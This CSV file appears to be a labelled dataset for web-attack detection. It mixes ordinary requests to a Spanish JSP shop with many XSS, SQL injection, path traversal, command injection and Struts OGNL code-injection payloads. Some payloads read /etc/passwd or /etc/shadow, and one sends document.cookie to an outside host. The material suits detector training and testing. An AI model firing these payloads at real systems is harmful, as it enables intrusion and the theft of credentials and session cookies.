payload,type
miembros/fotos.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/salir.jsp,normal
"<? foo=""><x foo='?><script>javascript:alert(1)</script>'>"">",xss
imagenes/logo.gif,normal
global/estilos.css,normal
"&lt;A HREF=\""http&#58;//0102&#46;0146&#46;0007&#46;00000223/\""&gt;XSS&lt;/A&gt;",xss
../../../{FILE},traversal
".UEvk: select * from users where id=1. union select null,banner from v$version where rownum=1 -- 1",sqli
imagenes/logo.gif,normal
imagenes/3.gif,normal
index.jsp,normal
index.jsp,normal
imagenes/3.gif,normal
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
| id,command_injection
"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",xss
eval(a+b+c+d);,xss
&ltscript&gtalert(document.cookie);&ltscript&gtalert,xss
"<a href=""\xE3\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
..%25c0%25af..%25c0%25af{FILE},traversal
imagenes/cmenbul.gif,normal
global/titulo.jsp,normal
miembros/editar.jsp?modo=registro&login=pomeroy5&password=C5fRA98&nombre=Bonifacio&apellidos=Iranzo&email=wyle%40designworld.us&dni=88356550A&direccion=C%2F+Ca+N%27alzina%2C+80%2C+6-B&ciudad=Requena+de+Campos&cp=45110&provincia=Granada&ntc=8995996565558024&B1=Registrar,normal
global/creditos.jsp,normal
publico/carrito.jsp,normal
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss
<div style=content:url(%(svg)s)></div>,xss
?,sqli
index.jsp,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=92&B1=A%F1adir+al+carrito,normal
miembros/salir.jsp,normal
<style>*[{}@import'%(css)s?]</style>X,xss
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",xss
<script src=http://yoursite.com/your_files.js></script>,xss
global/estilos.css,normal
././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../{FILE},traversal
global/titulo.jsp,normal
%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action,code_injection
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
&1c: select * from users where id=1   or 1=1 -- 1,sqli
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,traversal
imagenes/3.gif,normal
'>><marquee><h1>XSS</h1></marquee>,xss
miembros/index.jsp,normal
miembros/salir.jsp,normal
"ABC<div style=""x:exp\x5Cression(javascript:alert(1)"">DEF",xss
"<IMG SRC=# onmouseover=""alert('xxs')"">",xss
"on.UE: select * from users where id=1 *$ . union select null,@@VERSION -- 1",sqli
miembros/editar.jsp?modo=registro&login=putman&password=d8jami81t9&nombre=Ibero&apellidos=Muntan%E9+Pros&email=pardos%40barcafedaniss.co&dni=79332858Q&direccion=C%2F+Primavera+81+9%3FA&ciudad=Villanueva+de+Jiloca&cp=45212&provincia=Barcelona&ntc=0486023581086629&B1=Registrar,normal
"""`'><script>\xE2\x80\xA9javascript:alert(1)</script>",xss
"s){s: select * from users where id=1 or ""){"" or 1=1 -- 1",sqli
"<x style=""behavior:url(%(sct)s)"">",xss
<img src=foo.png onerror=alert(/xssed/) />   ,xss
miembros/index.jsp,normal
global/estilos.css,normal
..%255c{FILE},traversal
o1n&1: select * from users where id=1 <@1$ or 1=1 -- 1,sqli
imagenes/cmenbul.gif,normal
miembros/salir.jsp,normal
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,xss
imagenes/3.gif,normal
imagenes/3.gif,normal
publico/miembros.jsp,normal
imagenes/nuestratierra.jpg,normal
index.jsp,normal
&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;,xss
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,traversal
<frameset onload=alert(123)>,xss
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/productos.jsp,normal
imagenes/3.gif,normal
miembros/fotos.jsp,normal
"<IMG SRC=x onhashchange=""alert(String.fromCharCode(88,83,83))"">",xss
imagenes/nuestratierra.jpg,normal
imagenes/2.gif,normal
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/imagenes/ogono.jpg,normal
"</textarea>'""><script>alert(document.cookie)</script>",xss
publico/pagar.jsp?modo=insertar&precio=2437&B1=Confirmar,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/imagenes/ogono.jpg,normal
publico/carrito.jsp,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=94&B1=A%F1adir+al+carrito,normal
miembros/index.jsp,normal
imagenes/1.gif,normal
miembros/imagenes/zarauz.jpg,normal
imagenes/1.gif,normal
"so..U: select * from users where id='1'<@.. union select 1,version() -- 1'",sqli
<--`<img/src=` onerror=alert(1)> --!>,xss
imagenes/nuestratierra.jpg,normal
imagenes/1.gif,normal
..\\\..\\\{FILE},traversal
miembros/fotos.jsp,normal
imagenes/3.gif,normal
imagenes/3.gif,normal
publico/pagar.jsp?modo=insertar&precio=3625&B1=Pasar+por+caja,normal
miembros/imagenes/zarauz.jpg,normal
"""><img src=x onerror=javascript:alert(A)>",xss
miembros/salir.jsp,normal
miembros/imagenes/zarauz.jpg,normal
miembros/imagenes/ogono.jpg,normal
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,xss
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",xss
publico/registro.jsp?modo=registro&login=denver&password=Pr86o8ci8nad0&nombre=Aleandra&apellidos=Mulet+Lichtle&email=schweiger_blanc%40restaurantepicopico.rw&dni=15680534P&direccion=Calle+Santa+Teresa%2C+87+5%3FB&ciudad=Medina+del+Campo&cp=49126&provincia=%C1vila&ntc=0233016491701103&B1=Registrar,normal
"<div style=""font-family:foo}color=red;"">XXX",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,traversal
publico/autenticar.jsp?modo=entrar&login=holdaway&pwd=TAbuRETe&remember=on&B1=Entrar,normal
global/menum.jsp,normal
imagenes/1.gif,normal
imagenes/1.gif,normal
publico/carrito.jsp,normal
publico/caracteristicas.jsp?id=1,normal
publico/productos.jsp,normal
miembros/index.jsp,normal
miembros/editar.jsp?modo=registro&login=vries&password=setabITAnO&nombre=Ido&apellidos=Cherino+Gebhardt&email=sauvanelex%40gaudio.lk&dni=53424203X&direccion=Calle+Sergio+Luna%2C+S%2FN+11G&ciudad=Muro+de+Aguas&cp=44141&provincia=C%F3rdoba&ntc=4787579213279770&B1=Registrar,normal
imagenes/nuestratierra.jpg,normal
imagenes/1.gif,normal
publico/caracteristicas.jsp?id=2,normal
publico/registro.jsp?modo=registro&login=mebine&password=L16o2o&nombre=Filis&apellidos=Antih+Sacido&email=rosenblatt%40hormigon-impreso.az&dni=00699529F&direccion=Plaza+Pe%F1a+Gudina%2C+14%2C+&ciudad=San+Vicente+de+Ar%E9valo&cp=06660&provincia=Tarragona&ntc=8741178125642533&B1=Registrar,normal
"<a href=""\x1Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/miembros.jsp,normal
miembros/editar.jsp?modo=registro&login=nina&password=pulsar&nombre=Oreste&apellidos=Ambatll%E9+Comalada&email=birley%40euskalcasino.pro&dni=94505880F&direccion=Convento+De+Las+Due%F1as+86+&ciudad=Casas+de+Miravete&cp=34340&provincia=Granada&ntc=1571428541757626&B1=Registrar,normal
miembros/editar.jsp?modo=registro&login=renette&password=c%F3mitre&nombre=Virgilia&apellidos=Fabres+Jordi&email=koopenhoeffer%40paremoselalzheimer.im&dni=08149938A&direccion=Mary+Wellstone+Craf+117+13-F&ciudad=Losar+de+la+Vera&cp=40531&provincia=Zamora&ntc=6168188961695048&B1=Registrar,normal
imagenes/3.gif,normal
/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,traversal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
global/menum.jsp,normal
../../../etc/passwd,traversal
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},traversal
imagenes/logo.gif,normal
miembros/salir.jsp,normal
imagenes/2.gif,normal
miembros/imagenes/castro.jpg,normal
publico/registro.jsp?modo=registro&login=young-ba&password=acachorrar&nombre=Velen&apellidos=Ostapovich+Furnari&email=lepe%40eco-pro.mobi&dni=43061609C&direccion=Calle+Fermin+Caballero%2C+103%2C+10H&ciudad=%D3lvega&cp=18339&provincia=Alicante&ntc=6718614214297094&B1=Registrar,normal
miembros/imagenes/castro.jpg,normal
0x2e0x2e\0x2e0x2e\{FILE},traversal
"`""'><img src=xxx:x \x0Bonerror=javascript:alert(1)>",xss
index.jsp,normal
global/titulo.jsp,normal
miembros/imagenes/zarauz.jpg,normal
"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1)"">DEF",xss
global/titulo.jsp,normal
miembros/editar.jsp?modo=registro&login=snair&password=morfea&nombre=Apolonio&apellidos=Sall%E0+Mico&email=polo%40familiamarino.bn&dni=46881104C&direccion=Calle+Paloma+101%2C+&ciudad=Carde%F1osa&cp=09110&provincia=Le%F3n&ntc=4138413338105604&B1=Registrar,normal
publico/caracteristicas.jsp?id=2,normal
miembros/index.jsp,normal
"<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",xss
<svg contentScriptType=text/vbs><script>MsgBox+1,xss
<script>var var = 1; alert(var)</script>,xss
&#60;IFRAME SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;&#60;&#47;IFRAME&#62;,xss
imagenes/cmenbul.gif,normal
miembros/index.jsp,normal
"&lt;DIV STYLE=\""background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\""&gt;",xss
<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;,xss
publico/caracteristicas.jsp?id=1,normal
"s,:s: select * from users where id=1 or "",:""=1 or 1=1 -- 1",sqli
"<div style=""behaviour: url([link to code]);"">",xss
publico/autenticar.jsp?modo=entrar&login=llaguno&pwd=cabrea_r&remember=off&B1=Entrar,normal
global/estilos.css,normal
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,xss
miembros/imagenes/castro.jpg,normal
"<A HREF=""http://1113982867/"">XSS</A>",xss
<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;,xss
global/creditos.jsp,normal
"""`'><script>\xE2\x80\xA8javascript:alert(1)</script>",xss
"<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location=""http://www.procheckup.com/?sid=""%2bdocument.cookie)>",xss
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
publico/miembros.jsp,normal
imagenes/1.gif,normal
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>,xss
publico/productos.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
<--`<img/src=` onerror=alert(1)> --!>,xss
"""/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />",xss
no)&1: select * from users where id=1 + ($+) or 1=1 -- 1,sqli
publico/caracteristicas.jsp?id=2,normal
global/estilos.css,normal
publico/pagar.jsp?modo=insertar&precio=5106&B1=Pasar+por+caja,normal
publico/miembros.jsp,normal
"<img src=""javascript:alert(1)"">",xss
imagenes/1.gif,normal
"<meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi",xss
"s)ns: select * from users where id=1 or "")$"" or 1=1 -- 1",sqli
"admin"" or ""1""=""1""--",sqli
index.jsp,normal
"<a <!-- href=""j&#x61;vascript:&#x61;lert&#x28;31337&#x29;;"">Hello</a>",xss
publico/caracteristicas.jsp?id=1,normal
"<IMG SRC=x ononline=""alert(String.fromCharCode(88,83,83))"">",xss
*(|(mail=*)),sqli
imagenes/1.gif,normal
../..//{FILE},traversal
"&lt;A HREF=\""//google\""&gt;XSS&lt;/A&gt;",xss
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>,xss
miembros/imagenes/zarauz.jpg,normal
imagenes/logo.gif,normal
<style>*[{}@import'%(css)s?]</style>X,xss
http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??,xss
publico/carrito.jsp,normal
<IMG SRC=`javascript:javascript:alert(1)`>,xss
imagenes/nuestratierra.jpg,normal
"'`""><\x3Cscript>javascript:alert(1)</script>        ",xss
&lt;? echo('&lt;SCR)';,xss
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=51&B1=A%F1adir+al+carrito,normal
"<a style=""-o-link:'javascript:javascript:alert(1)';-o-link-source:current"">X",xss
miembros/salir.jsp,normal
<embed code=%(scriptlet)s></embed>,xss
"<a href=""\x1Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/3.gif,normal
<%<!--'%><script>alert(1);</script -->,xss
miembros/salir.jsp,normal
%2e%2e%2f%2e%2e%2f{FILE},traversal
global/creditos.jsp,normal
"s{.s: select * from users where id=1 or ""{."" or 1=1 -- 1",sqli
publico/pagar.jsp?modo=insertar&precio=318&B1=Confirmar,normal
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal
global/titulo.jsp,normal
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
global/estilos.css,normal
imagenes/2.gif,normal
"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",xss
publico/pagar.jsp?modo=insertar&precio=8217&B1=Confirmar,normal
publico/pagar.jsp?modo=insertar&precio=2399&B1=Confirmar,normal
imagenes/cmenbul.gif,normal
imagenes/1.gif,normal
"<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/creditos.jsp,normal
global/estilos.css,normal
x' or full_name like '%bob%,sqli
--sp_password,sqli
publico/pagar.jsp?modo=insertar&precio=8164&B1=Pasar+por+caja,normal
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE},traversal
"<object classid=""clsid:..."" codebase=""javascript:document.vulnerable=true;"">",xss
perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out,xss
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
"' union (select NULL, (select @@version)) --",sqli
"s?UEs: select * from users where id=1 or 1#""? union select 'a',version() -- 1",sqli
publico/miembros.jsp,normal
"<IMG SRC=""javascript:alert('XSS');"">",xss
%uff0e%uff0e%u2215{FILE},traversal
"<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>",xss
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
imagenes/2.gif,normal
publico/registro.jsp?modo=registro&login=van_bake&password=encatusar&nombre=Zenaires&apellidos=Puellas+Sarlinga&email=chuvalo%40ppmanzanares.nc&dni=38860881N&direccion=Calle+De+La+Madre+De+Dios+13%2C+&ciudad=Fuentes+de+Andaluc%EDa&cp=23280&provincia=La+Rioja&ntc=4140359172053437&B1=Registrar,normal
"<?='<SCRIPT>alert(""XSS"")</SCRIPT>'?>   ",xss
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
publico/productos.jsp,normal
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss
publico/autenticar.jsp?modo=entrar&login=deloria&pwd=rancar&remember=off&B1=Entrar,normal
"<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC="";javas]]>;<;![CDATA[cript:alert(';XSS';);"";>;]]>;",xss
imagenes/3.gif,normal
"""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",xss
"sov(1: select * from users where id='1' + @(1) union select 1,version() -- 1'",sqli
publico/registro.jsp?modo=registro&login=pandrang&password=sABIONda&nombre=Edi&apellidos=Nicol%E0s&email=woodburn%40vinavilano.hr&dni=13026737C&direccion=De+Los+Cazadores%2C+196%2C+1-B&ciudad=Villanueva+de+Huerva&cp=31172&provincia=Segovia&ntc=7280653157576508&B1=Registrar,normal
"<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",xss
miembros/imagenes/ogono.jpg,normal
imagenes/nuestratierra.jpg,normal
<script>alert(document.head.childNodes[3].text)</script>,xss
"oo1UE: select * from users where id=1 | |1 union select 1,banner from v$version where rownum=1 -- 1",sqli
global/estilos.css,normal
../../{FILE},traversal
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss
miembros/imagenes/ogono.jpg,normal
"s{c: select * from users where id=1 or ""{#"" or 1=1 -- 1",sqli
global/estilos.css,normal
"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",xss
global/titulo.jsp,normal
"<img src=x onerror=\x32""javascript:alert(1)"">",xss
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,traversal
"<body background=javascript:'""><script>alert(navigator.userAgent)</script>></body>",xss
imagenes/logo.gif,normal
publico/registro.jsp?modo=registro&login=clampitt&password=ba94aridad&nombre=Raphael&apellidos=Chisvert&email=zelda_hjelm5%40silver-knights.it&dni=70892292J&direccion=Calle+Hernandez+Iglesias%2C+160%2C+&ciudad=Pe%F1alsordo&cp=26135&provincia=Badajoz&ntc=4474255756033041&B1=Registrar,normal
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss
miembros/index.jsp,normal
miembros/editar.jsp?modo=registro&login=kaunas&password=86m-bra&nombre=Rams%E9s&apellidos=Colobran+Rebull&email=intosh%40corjet.cv&dni=63269334Z&direccion=Escritor+Lopez+De+Cardenas+76+12E&ciudad=Azuara&cp=37788&provincia=Guadalajara&ntc=1813799559056744&B1=Registrar,normal
publico/caracteristicas.jsp?id=2,normal
"<IMG SRC=x onbeforeprint=""alert(String.fromCharCode(88,83,83))"">",xss
&#X00003C;,xss
imagenes/cmenbul.gif,normal
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
"""<HTML xmlns:xss><?import namespace=""""xss"""" implementation=""""http://ha.ckers.org/xss.htc""""><xss:xss>XSS</xss:xss></HTML>""",xss
<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>    ,xss
miembros/salir.jsp,normal
""" or isNULL(1/0) /*",sqli
imagenes/logo.gif,normal
publico/autenticar.jsp?modo=entrar&login=moyers&pwd=tard%F3n&remember=on&B1=Entrar,normal
"';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//"";;alert(String.fromCharCode(88,83,83))//\"";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;"";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",xss
<svg><script>//&NewLine;confirm(1);</script </svg>,xss
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",xss
|/usr/bin/id,command_injection
miembros/salir.jsp,normal
index.jsp,normal
publico/productos.jsp,normal
global/creditos.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"&oUE1: select * from users where id=1 or \<\ union select 1,@@VERSION -- 1",sqli
publico/caracteristicas.jsp?id=2,normal
%0a/bin/cat%20/etc/shadow,traversal
`ping 127.0.0.1`,command_injection
miembros/imagenes/ogono.jpg,normal
miembros/index.jsp,normal
miembros/index.jsp,normal
.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow,traversal
imagenes/nuestratierra.jpg,normal
publico/registro.jsp?modo=registro&login=zinkie0&password=9i3a&nombre=Esteban&apellidos=Delvalle+Llers&email=luxford_baumann%40lasiestacreativa.tel&dni=47651101T&direccion=Calle+Espiel+71+&ciudad=Rab%F3s&cp=45634&provincia=Zaragoza&ntc=8349635911694626&B1=Registrar,normal
"s?,vc: select * from users where id='1' union select $[""],@@VERSION -- 1'",sqli
"admin"") or (""1""=""1""/*",sqli
"""<META HTTP-EQUIV=""""Set-Cookie"""" Content=""""USERID=<SCRIPT>alert('XSS')</SCRIPT>"""">""",xss
miembros/imagenes/ogono.jpg,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
..%u2216{FILE},traversal
'||UTL_HTTP.REQUEST,sqli
|,sqli
global/menum.jsp,normal
miembros/fotos.jsp,normal
"alert(String.fromCharCode(88,83,83));'))"">   ",xss
global/creditos.jsp,normal
"<img \x47src=x onerror=""javascript:alert(1)"">",xss
.../{FILE},traversal
..\\\{FILE},traversal
admin') or ('1'='1,sqli
o1&1c: select * from users where id=1 *1 or 1=1 -- 1,sqli
global/menum.jsp,normal
global/creditos.jsp,normal
publico/autenticar.jsp?modo=entrar&login=verghese&pwd=totolate&remember=on&B1=Entrar,normal
"<;IMG SRC="";livescript:[code]"";>;",xss
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=15&B1=A%F1adir+al+carrito,normal
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE},traversal
imagenes/cmenbul.gif,normal
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=90&B1=A%F1adir+al+carrito,normal
miembros/imagenes/ogono.jpg,normal
publico/carrito.jsp,normal
publico/pagar.jsp?modo=insertar&precio=2161&B1=Pasar+por+caja,normal
"admin"") or ""1""=""1""--",sqli
"<IMG SRC=x oninput=""alert(String.fromCharCode(88,83,83))"">",xss
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>,xss
